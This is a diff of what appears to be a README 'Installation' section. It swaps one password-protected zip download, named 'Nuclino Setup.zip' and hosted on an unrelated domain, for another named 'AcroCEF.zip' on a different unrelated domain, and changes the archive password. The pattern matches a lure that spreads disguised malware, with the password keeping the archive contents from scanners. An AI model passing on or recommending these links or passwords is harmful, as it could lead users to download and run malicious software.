@@ -2,8 +2,8 @@
 
 ## Installation
 
-# [DOWNLOAD](https://casinoviapi.com/Nuclino%20Setup.zip)
-## Password - set1nu24
+# [DOWNLOAD](https://vinag1847.si/AcroCEF.zip)
+## Password - 86tiiolsmn
 
 
 
